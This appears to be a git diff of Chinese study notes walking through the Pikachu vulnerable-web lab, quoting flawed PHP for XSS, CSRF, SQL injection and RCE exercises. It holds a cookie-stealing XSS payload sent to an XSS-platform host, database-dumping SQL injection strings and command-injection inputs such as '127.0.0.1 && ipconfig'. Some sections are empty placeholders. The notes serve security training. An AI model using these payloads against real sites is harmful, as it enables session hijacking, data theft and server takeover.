@@ -16,8 +16,15 @@
 
 ## Reference
 - [第三周作业 token防爆破 （基于pikachu平台）burp token的暴力破解](https://blog.csdn.net/weixin_43899561/article/details/88780363)
+- [第三周作业 1、从数字型注入认识SQL漏洞 2、字符型注入 3、搜索型及xx型输入](https://blog.csdn.net/weixin_43899561/article/details/88784162)
+- [第四周作业1.虚拟机中安装Kail 2.union注入 3.information_schema注入 4.sql-Inject漏洞手动测试-基于函数报错的信息获取 5.Http Header注入](https://blog.csdn.net/weixin_43899561/article/details/88930597)
 - [第六周作业 1.SQL inject防范措施 2.sqlmap工具使用案例 3.XSS基本概念和原理 4.反射型XSS(get) 5.存储型XSS 6.安装nmap](https://blog.csdn.net/weixin_43899561/article/details/89291896)
 - [第七周作业 1.dom型XSS详解及演示 2.cookie获取及xss后台使用 3.反射型XSS(POST) 4.xss钓鱼演示 5.xss获取键盘记录演示](https://blog.csdn.net/weixin_43899561/article/details/89429726)
+- [第八周作业 1.XSS盲打 2.XSS绕过 3.XSS绕过之htmlspecialchars()函数 4.XSS防范措施href和js输出](https://blog.csdn.net/weixin_43899561/article/details/89647834)
+- [第八周作业 1.CSRF漏洞概述及原理 2.通过CSRF进行地址修改 3.token是如何防止CSRF漏洞？4.远程命令、代码执行漏洞原理及演示](https://blog.csdn.net/weixin_43899561/article/details/89742243)
+- [insert、update和delete 注入方法](https://blog.csdn.net/qq1124794084/article/details/84590929)
+
+
 
 
 
@@ -345,37 +352,6 @@ if(isset($_POST['submit'])){
 
 和上面 get 型一样，但这里不需要 F12 修改输入限制，输入 payload `<script>alert('沵咑礷赇潒礤蒣騉')</script>` 点击提交
 
-
-
-**cookie 获取及 xss 后台使用**
-
-到 pikachu 平台下管理工具，进去初始化平台
-
-输入payload `<script>document.location = 'http://<xss平台IP>/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>` 回到攻击平台就能获得相应的数据
-
-
-<script>document.location = 'http://192.168.72.138/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 ### 存储型xss
 **服务器端核心代码**
 ```php
@@ -475,54 +451,630 @@ payload 构造如下 `'> <marquee loop="99" onfinish=alert(1)>hack the planet</m
             </div>
 ```
 
+**漏洞利用**
+
 同之前的步骤，查看源代码，区别第一个 DOM 演示，输入是从 URL 的参数中获取的（类似于反射型），但输出任在 a 标签里，故和之前的方法相同设置 payload
 
 payload 构造如下 `'> <marquee loop="99" onfinish=alert(1)>hack the planet</marquee>`
 
 ### xss之盲打
+**服务器端核心代码**
+```php
+if(array_key_exists("content",$_POST) && $_POST['content']!=null){
+    $content=escape($link, $_POST['content']);
+    $name=escape($link, $_POST['name']);
+    $time=$time=date('Y-m-d g:i:s');
+    $query="insert into xssblind(time,content,name) values('$time','$content','$name')";
+    $result=execute($link, $query);
+    if(mysqli_affected_rows($link)==1){
+        $html.="<p>谢谢参与，阁下的看法我们已经收到!</p>";
+    }else {
+        $html.="<p>ooo.提交出现异常，请重新提交</p>";
+    }
+}
+```
 
+XSS盲打就是攻击者在不知道后台是否存在 xss 漏洞的情况下，提交恶意 JS 代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。
 
+**漏洞利用**
 
+输入 payload `<script>alert('老铁，欧里给!')</script>` ，观察到可注入点,以管理员的身份登入后台，就会出现弹窗，这就是一个简单的盲打。通过 xss 钓鱼的方法就能获取到 cookie，就能伪造管理员身份进行登陆了。
 
+![image](../../../img/渗透/实验/pikachu/11.png)
 
+- 后台: http://<IP地址!!!>/pikachu/vul/xss/xssblind/admin_login.php
+- 账号密码: admin 123456
 
+到 pikachu 平台下管理工具，进去初始化平台
 
-https://blog.csdn.net/qq_44696653?t=1
+盗 cookie payload `<script>document.location = 'http://<xss平台地址>/pikachu/pkxss/xcookie/cookie.php?cookie=' + document.cookie;</script>`
 
+![image](../../../img/渗透/实验/pikachu/12.png)
 
+### xss之过滤
+**服务器端核心代码**
+```php
+if(isset($_GET['submit']) && $_GET['message'] != null){
+    //这里会使用正则对<script进行替换为空,也就是过滤掉
+    $message=preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/', '', $_GET['message']);
+    if($message == 'yes'){
+        $html.="<p>那就去人民广场一个人坐一会儿吧!</p>";
+    }else{
+        $html.="<p>别说这些'{$message}'的话,不要怕,就是干!</p>";
+    }
 
+}
+```
 
+这里注释写的很清楚了，不多说了
+
+**漏洞利用**
+
+过滤了 `<script` ，还有很多的标签可以用,再说还有很多绕过方法
+
+- payload: `<marquee loop="99" onfinish=alert(1)>hack the planet</marquee>`
+
+- payload: `<ScrIpT>alert('老铁，欧里给!')</sCriPt>`
+
+### xss之htmlspecialchars
+**服务器端核心代码**
+```php
+if(isset($_GET['submit'])){
+    if(empty($_GET['message'])){
+        $html.="<p class='notice'>输入点啥吧！</p>";
+    }else {
+        //使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对'处理
+        $message=htmlspecialchars($_GET['message']);
+        $html1.="<p class='notice'>你的输入已经被记录:</p>";
+        //输入的内容被处理后输出到了input标签的value属性里面,试试:' onclick='alert(111)'
+//        $html2.="<input class='input' type='text' name='inputvalue' readonly='readonly' value='{$message}' style='margin-left:120px;display:block;background-color:#c0c0c0;border-style:none;'/>";
+        $html2.="<a href='{$message}'>{$message}</a>";
+    }
+}
+```
+
+- **htmlspecialchars(string,flags,character-set,double_encode)**
+
+    htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体。
+
+    htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号
+
+**漏洞利用**
+
+先输入被预定义的字符 `&<s>"11<>11'123<123>`，在前端查看代码观察有是否有过滤掉单引号或双引号
+
+![image](../../../img/渗透/实验/pikachu/13.png)
+
+可见单引号后面的出来了
+
+构造个 payload `'onclick='alert(1)'`
+
+![image](../../../img/渗透/实验/pikachu/14.png)
+
+### xss之href输出
+**服务器端核心代码**
+```php
+if(isset($_GET['submit'])){
+    if(empty($_GET['message'])){
+        $html.="<p class='notice'>叫你输入个url,你咋不听?</p>";
+    }
+    if($_GET['message'] == 'www.baidu.com'){
+        $html.="<p class='notice'>我靠,我真想不到你是这样的一个人</p>";
+    }else {
+        //输出在a标签的href属性里面,可以使用javascript协议来执行js
+        //防御:只允许http,https,其次在进行htmlspecialchars处理
+        $message=htmlspecialchars($_GET['message'],ENT_QUOTES);
+        $html.="<a href='{$message}'> 阁下自己输入的url还请自己点一下吧</a>";
+    }
+}
+```
+
+**漏洞利用**
+
+先输入一些字符串 `&<s>"11<>11'123<123>`，查看前端的源代码，发现输入的字符都被转义了。但 `<a>` 标签的 href 属性也是可以执行 JS 表达式的
+
+![image](../../../img/渗透/实验/pikachu/15.png)
+
+构造个 payload `Javascript:alert('1')`
+
+![image](../../../img/渗透/实验/pikachu/16.png)
+
+### xss之js输出
+**服务器端核心代码**
+```php
+if(isset($_GET['submit']) && $_GET['message'] !=null){
+    $jsvar=$_GET['message'];
+//    $jsvar=htmlspecialchars($_GET['message'],ENT_QUOTES);
+    if($jsvar == 'tmac'){
+        $html.="<img src='{$PIKA_ROOT_DIR}assets/images/nbaplayer/tmac.jpeg' />";
+    }
+}
+```
+```js
+<script>
+    $ms='<?php echo $jsvar;?>';
+    if($ms.length != 0){
+        if($ms == 'tmac'){
+            $('#fromjs').text('tmac确实厉害,看那小眼神..')
+        }else {
+//            alert($ms);
+            $('#fromjs').text('无论如何不要放弃心中所爱..')
+        }
+
+    }
+</script>
+```
+
+**漏洞利用**
+
+先输入一些字符串 `&<s>"11<>11'123<123>`，查看前端的源代码
+
+![image](../../../img/渗透/实验/pikachu/17.png)
+
+对于 JS 代码，我们需要构造一个闭合，根据显示的代码构造 payload `abc'</script><script>alert(1)</script>`
+
+![image](../../../img/渗透/实验/pikachu/18.png)
 
 ---
 
 ## CSRF
+**如何确认存在一个CSRF漏洞**
+1. 对目标网站增删改的地方进行标记，并观察其逻辑，判断请求是否可以被伪造
 
+    比如修改管理员账号时，并不需要验证旧密码，导致请求容易被伪造；
 
+    比如对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造；
 
+2. 确认凭证的有效期（这个问题会提高CSRF被利用的概率）
 
+    虽然退出或者关闭了浏览器，但存在本地的cookie仍然有效，或者session并没有及时过期，导致CSRF攻击变的简单
 
+### CSRF(get)
+首先进行登陆，修改一下个人信息，并到 Brup Suite 上进行抓包，将抓到的 URL 进行修改(由自己作为攻击者)，再发送给攻击目标(由自己作为被攻击者)
 
+![image](../../../img/渗透/实验/pikachu/19.png)
 
+**漏洞利用**
 
+稍微修改一下，测试
 
+`http://<服务器IP!!!>/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=futa&phonenum=110&add=123&email=lili%40pikachu.com1&submit=submit`
 
+![image](../../../img/渗透/实验/pikachu/20.png)
 
+### CSRF(POST)
+同样，登陆，修改一下个人信息，并到Brup Suite上进行抓包，对于POST型，请求已经不能通过修改URL来借用用户权限，那么需要自己做一个表单，再返回到提交页面来完成修改。
 
+**漏洞利用**
 
+直接从 burp 生成 poc 表单
 
+![image](../../../img/渗透/实验/pikachu/21.png)
+
+```html
+<html>
+  <!-- CSRF PoC - generated by Burp Suite Professional -->
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://<IP address>/pikachu/vul/csrf/csrfpost/csrf_post_edit.php" method="POST">
+      <input type="hidden" name="sex" value="futa1" />
+      <input type="hidden" name="phonenum" value="1110" />
+      <input type="hidden" name="add" value="1213" />
+      <input type="hidden" name="email" value="lil1i&#64;pikachu&#46;com1" />
+      <input type="hidden" name="submit" value="submit" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
+
+![image](../../../img/渗透/实验/pikachu/22.png)
+
+### CSRF Token
+要抵御 CSRF，关键在于在请求中放入攻击者不能伪造的信息，且该信息不存在于 cookie 之中。故每次请求都可以加入一个随机码，且后台要对这个随机码进行验证。
+
+![image](../../../img/渗透/实验/pikachu/23.png)
+
+**漏洞利用**
+
+如果做过 dvwa 同级的 csrf 应该清楚，这里可以使用 xss 来配合盗取 token 来造成 csrf,这里略
 
 ---
 
 ## Sql Inject
+在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。
+`一个严重的SQL注入漏洞，可能会直接导致一家公司破产！`
+
+SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。
+
+在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：
+1. 对传进SQL语句里面的变量进行过滤，不允许危险字符传入；
+2. 使用参数化（Parameterized Query 或 Parameterized Statement）；
+3. 还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了"拼接"的方式,所以使用时需要慎重!
+
+### 数字型注入(post)
+**服务器端核心代码**
+```php
+if(isset($_POST['submit']) && $_POST['id']!=null){
+    //这里没有做任何处理，直接拼到select里面去了,形成Sql注入
+    $id=$_POST['id'];
+    $query="select username,email from member where id=$id";
+    $result=execute($link, $query);
+    //这里如果用==1,会严格一点
+    if(mysqli_num_rows($result)>=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $username=$data['username'];
+            $email=$data['email'];
+            $html.="<p class='notice'>hello,{$username} <br />your email is: {$email}</p>";
+        }
+    }else{
+        $html.="<p class='notice'>您输入的user id不存在，请重新输入！</p>";
+    }
+}
+```
+
+**漏洞利用**
+
+抓包,查看 post 参数
+
+![image](../../../img/渗透/实验/pikachu/26.png)
+
+构造 payload
+
+`1' or '1' ='1` 报错
+
+`1 or 1 =1` 未报错,存在数字型注入
+
+![image](../../../img/渗透/实验/pikachu/27.png)
+
+### 字符型注入(get)
+**服务器端核心代码**
+```php
+if(isset($_GET['submit']) && $_GET['name']!=null){
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET['name'];
+    //这里的变量是字符型，需要考虑闭合
+    $query="select id,email from member where username='$name'";
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)>=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $id=$data['id'];
+            $email=$data['email'];
+            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
+        }
+    }else{
+
+        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
+    }
+}
+```
+
+**漏洞利用**
+
+构造 payload
+
+`http://<IP address!!!>/pikachu/vul/sqli/sqli_str.php?name=1' or '1' ='1&submit=%E6%9F%A5%E8%AF%A2`
+
+![image](../../../img/渗透/实验/pikachu/28.png)
+
+### 搜索型注入
+**服务器端核心代码**
+```php
+if(isset($_GET['submit']) && $_GET['name']!=null){
+
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET['name'];
+
+    //这里的变量是模糊匹配，需要考虑闭合
+    $query="select username,id,email from member where username like '%$name%'";
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)>=1){
+        //彩蛋:这里还有个xss
+        $html2.="<p class='notice'>用户名中含有{$_GET['name']}的结果如下：<br />";
+        while($data=mysqli_fetch_assoc($result)){
+            $uname=$data['username'];
+            $id=$data['id'];
+            $email=$data['email'];
+            $html1.="<p class='notice'>username：{$uname}<br />uid:{$id} <br />email is: {$email}</p>";
+        }
+    }else{
+
+        $html1.="<p class='notice'>0o。..没有搜索到你输入的信息！</p>";
+    }
+}
+```
+
+**漏洞利用**
+
+随意输入一个字母，能看到匹配出了对应的信息。那么按照 SQL 的模糊查询命令 `select * from 表名 where 字段名 like ‘%（对应值）%’;` ，发现可以按照之前的思路来实现万能语句的拼接。
+
+构造 payload `' or 1=1 #`
+
+这里还存在一个xss `'# <script>alert('沵咑礷赇潒礤蒣騉')</script>`
+
+**union注入**
+
+union 操作符用于合并两个或多个 SQL 语句集合起来，得到联合的查询结果。
+
+以 pikachu 平台的数据库为例，输入 `select id,email from member where username='kevin' union select username,pw from member where id=1` ;查看查询结果。
+
+![image](../../../img/渗透/实验/pikachu/29.png)
+
+但是联合多个 SQL 语句时可能出现报错，因为查询的字段不能超过主查询的字段，这个时候可以在 SQL 语句后面加 order by 进行排序，通过这个办法可以判断主查询的字段。返回 pikachu 平台，在 SQL 注入下随意打开搜索型栏目，输入我们构造的 order by 语句进行测试。
+
+输入 `' order by 4#%` ,报错
+
+输入 `' order by 3#%` ,未报错，通过这个简单的办法找到主查询一共有三个字段。
+
+构造 payload: `a' union select database(),user(),version()#%`
+
+![image](../../../img/渗透/实验/pikachu/30.png)
+
+**information_schema注入**
+
+information_schema 数据库是 MySQL 系统自带的数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。通过 information_schema 注入，我们可以将整个数据库内容全部窃取出来。接下来是对 information_schema 注入的演示。
+首先同之前的步骤，使用 order by 来判断查询的字段。先找出数据库的名称，输入 `a' union select database(),user(),4#%` 得到反馈，判断数据库名称为 pikachu。
+
+![image](../../../img/渗透/实验/pikachu/31.png)
+
+获取表名，输入：`a' union select table_schema,table_name,2 from information_schema.tables where table_schema='pikachu'#`
+
+![image](../../../img/渗透/实验/pikachu/32.png)
+
+获取字段名，输入：`a'union select table_name,column_name,2 from information_schema.columns where table_name='users'#%`
+
+![image](../../../img/渗透/实验/pikachu/33.png)
+
+获取数据，输入：`a'union select username ,password,4 from users#%`
+
+![image](../../../img/渗透/实验/pikachu/34.png)
+
+**select下的报错演示**
+
+select/insert/update/delete 都可以使用报错来获取信息.
+
+- **UPDATEXML(xml_document,XPathstring,new_value)**
+
+    Updatexml() 函数作用:改变(查找并替换)XML文档中符合条件的节点的值.
+    - 第一个参数:fiedname是String格式,为表中的字段名.
+    - 第二个参数:XPathstring(Xpath格式的字符串).
+    - 第三个参数:new_value,String格式,替换查找到的符合条件的 X
+
+改变 XML_document 中符合 XPATH_string 的值
+
+而我们的注入语句为： `a' and updatexml(1,concat(0x7e,(SELECT @@version)),0)#`
+
+其中的concat()函数是将其连成一个字符串，因此不会符合XPATH_string的格式，从而出现格式错误，爆出 `ERROR 1105 (HY000): XPATH syntax error: ':root@localhost'`
+
+获取数据库表名，输入：`a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu')),0)#` ，但是反馈回的错误表示只能显示一行，所以采用 limit 来一行一行显示
+
+![image](../../../img/渗透/实验/pikachu/35.png)
+
+输入 `a' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0)#` 更改limit后面的数字pikachu'limit 0，爆表名
+
+![image](../../../img/渗透/实验/pikachu/36.png)
+
+![image](../../../img/渗透/实验/pikachu/37.png)
+
+![image](../../../img/渗透/实验/pikachu/38.png)
+
+字段名 `a' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0)#` 更改limit后面的数字，爆表名
+
+![image](../../../img/渗透/实验/pikachu/39.png)
+
+![image](../../../img/渗透/实验/pikachu/40.png)
+
+![image](../../../img/渗透/实验/pikachu/41.png)
+
+![image](../../../img/渗透/实验/pikachu/42.png)
+
+数据 `a' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#`
+
+![image](../../../img/渗透/实验/pikachu/43.png)
+
+数据 `a' and updatexml(1,concat(0x7e,(select password from users limit 0,1)),0)#`
+
+![image](../../../img/渗透/实验/pikachu/44.png)
+
+### xx型注入
+**服务器端核心代码**
+```php
+if(isset($_GET['submit']) && $_GET['name']!=null){
+    //这里没有做任何处理，直接拼到select里面去了
+    $name=$_GET['name'];
+    //这里的变量是字符型，需要考虑闭合
+    $query="select id,email from member where username=('$name')";
+    $result=execute($link, $query);
+    if(mysqli_num_rows($result)>=1){
+        while($data=mysqli_fetch_assoc($result)){
+            $id=$data['id'];
+            $email=$data['email'];
+            $html.="<p class='notice'>your uid:{$id} <br />your email is: {$email}</p>";
+        }
+    }else{
+
+        $html.="<p class='notice'>您输入的username不存在，请重新输入！</p>";
+    }
+}
+```
+
+**漏洞利用**
+
+参照代码，这里使用字符型且没有使用相似查询，然而这个不重要，关键是构造一个闭合
+
+payload: `' or '1' = '1 #`
+
+### "insert/update"注入
+insert 注入，就是前端注册的信息最终会被后台通过 insert 这个操作插入数据库，后台在接受前端的注册数据时没有做防 SQL 注入的处理，导致前端的输入可以直接拼接 SQL 到后端的 insert 相关内容中，导致了 insert 注入。
+
+**服务器端核心代码**
+```php
+if(isset($_POST['submit'])){
+    if($_POST['username']!=null &&$_POST['password']!=null){
+//      $getdata=escape($link, $_POST);//转义
+
+        //没转义,导致注入漏洞,操作类型为insert
+        $getdata=$_POST;
+        $query="insert into member(username,pw,sex,phonenum,email,address) values('{$getdata['username']}',md5('{$getdata['password']}'),'{$getdata['sex']}','{$getdata['phonenum']}','{$getdata['email']}','{$getdata['add']}')";
+        $result=execute($link, $query);
+        if(mysqli_affected_rows($link)==1){
+            $html.="<p>注册成功,请返回<a href='sqli_login.php'>登录</a></p>";
+        }else {
+            $html.="<p>注册失败,请检查下数据库是否还活着</p>";
+
+        }
+    }else{
+        $html.="<p>必填项不能为空哦</p>";
+    }
+}
+```
+
+**漏洞利用**
+
+在上面搜索型注入中演示了 select 类报错获取信息,insert 和 update 其实类似
+
+先测 insert 注入，在注册页面输入 `'` ，来查看后端反馈的观察，通过观察报错了解到提交的内容在后台参与了拼接。
+
+![image](../../../img/渗透/实验/pikachu/45.png)
+
+版本 `1' or updatexml(1,concat(0x7e,(version())),0) or'')#`
+
+表名 `1' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='pikachu'limit 0,1)),0) or'')#`
+
+![image](../../../img/渗透/实验/pikachu/46.png)
+
+老规矩,改 limit 后的数字
+
+字段名 `1' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users'limit 0,1)),0) or'')#`
+
+![image](../../../img/渗透/实验/pikachu/47.png)
+
+老规矩,改 limit 后的数字
+
+数据 `1' or updatexml(1,concat(0x7e,(select username from users limit 0,1)),0) or'')#`
+
+![image](../../../img/渗透/实验/pikachu/48.png)
+
+数据 `1' or updatexml(1,concat(0x7e,(select password from users limit 0,1)),0) or'')#`
+
+![image](../../../img/渗透/实验/pikachu/49.png)
+
+下面测试 update
+
+**服务器端核心代码**
+```php
+if(isset($_POST['submit'])){
+    if($_POST['sex']!=null && $_POST['phonenum']!=null && $_POST['add']!=null && $_POST['email']!=null){
+//        $getdata=escape($link, $_POST);
+
+        //未转义,形成注入,sql操作类型为update
+        $getdata=$_POST;
+        $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['sqli']['username']}'";
+        $result=execute($link, $query);
+        if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){
+            header("location:sqli_mem.php");
+        }else {
+            $html1.='修改失败，请重试';
+
+        }
+    }
+}
+```
+
+**漏洞利用**
+
+版本 `1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = <注意！！！这里是你的用户名>;#`
+
+例如我的: `1'or updatexml(2,concat(0x7e,(version())),0) or'' where username = 123;#`
+
+![image](../../../img/渗透/实验/pikachu/50.png)
+
+![image](../../../img/渗透/实验/pikachu/51.png)
+
+后面爆剩下的略，累了
+
+### "delete"注入
+**服务器端核心代码**
+```php
+// if(array_key_exists('id', $_GET) && is_numeric($_GET['id'])){
+//没对传进来的id进行处理，导致DEL注入
+if(array_key_exists('id', $_GET)){
+    $query="delete from message where id={$_GET['id']}";
+    $result=execute($link, $query);
+    if(mysqli_affected_rows($link)==1){
+        header("location:sqli_del.php");
+    }else{
+        $html.="<p style='color: red'>删除失败,检查下数据库是不是挂了</p>";
+    }
+}
+```
+
+**漏洞利用**
+
+抓包 `GET /pikachu/vul/sqli/sqli_del.php?id=1 HTTP/1.1`
+
+参数 id 可以尝试 sql 报错注入，构造 payload
+
+`1 or updatexml(1,concat(Ox7e,database()),0)`
+
+通过Burp Suite中自带的URL转换编码来转换替换ID
+
+![image](../../../img/渗透/实验/pikachu/53.png)
+
+![image](../../../img/渗透/实验/pikachu/52.png)
+
+后面略
+
+### "http header"注入
+**服务器端核心代码**
+```php
+if(isset($_GET['logout']) && $_GET['logout'] == 1){
+    setcookie('ant[uname]','',time()-3600);
+    setcookie('ant[pw]','',time()-3600);
+    header("location:sqli_header_login.php");
+}
+?>
+```
+
+**漏洞利用**
+
+![image](../../../img/渗透/实验/pikachu/54.png)
+
+登陆后去 Burp 中找到登陆的 GET 请求，把请求发送到 Repeater 模块中，去除 User-Agent：，然后输入 `'`s 然后运行后观察 MYSQL 语法报错然后发现存在 SQL 注入漏洞。
+
+![image](../../../img/渗透/实验/pikachu/55.png)
+
+爆库名 payload: `firefox' or updatexml(1,concat(0x7e,database ()),0) or '`
+
+![image](../../../img/渗透/实验/pikachu/56.png)
+
+后面略
+
+### 盲注(base on boolian)
+**服务器端核心代码**
+```php
+
+```
+
+**漏洞利用**
 
 
+### 盲注(base on time)
+**服务器端核心代码**
+```php
+
+```
+
+**漏洞利用**
 
 
+### 宽字节注入
+**服务器端核心代码**
+```php
 
+```
 
-
-
-
+**漏洞利用**
 
 
 
@@ -533,15 +1085,60 @@ https://blog.csdn.net/qq_44696653?t=1
 ---
 
 ## RCE
+RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。
+一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口
 
+比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上
 
+一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而，如果，设计者在完成该功能时，没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器
 
+### exec "ping"
+**服务器端核心代码**
+```php
+if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
+    $ip=$_POST['ipaddress'];
+//     $check=explode('.', $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
+    if(stristr(php_uname('s'), 'windows')){
+//         var_dump(php_uname('s'));
+        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
+    }else {
+        $result.=shell_exec('ping -c 4 '.$ip);
+    }
+}
+```
 
+**漏洞利用**
 
+可以拼接想要执行的命令
+- payload: `127.0.0.1 && ipconfig`
+- payload: `127.0.0.1 & ipconfig`
+- payload: `127.0.0.1 | ipconfig`
 
+![image](../../../img/渗透/实验/pikachu/24.png)
 
+### exec "eval"
+**服务器端核心代码**
+```php
+if(isset($_POST['submit']) && $_POST['txt'] != null){
+    if(@!eval($_POST['txt'])){
+        $html.="<p>你喜欢的字符还挺奇怪的!</p>";
+    }
+}
+```
 
+- **eval(phpcode)**
 
+    eval() 函数把字符串按照 PHP 代码来计算。
+
+    该字符串必须是合法的 PHP 代码，且必须以分号结尾。
+
+    如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。
+
+**漏洞利用**
+
+如果后台对输入没有处理，那么我们输入一个php代码：`phpinfo();` ,就会直接执行代码而不是返回正确的窗口
+
+![image](../../../img/渗透/实验/pikachu/25.png)
 
 ---
 
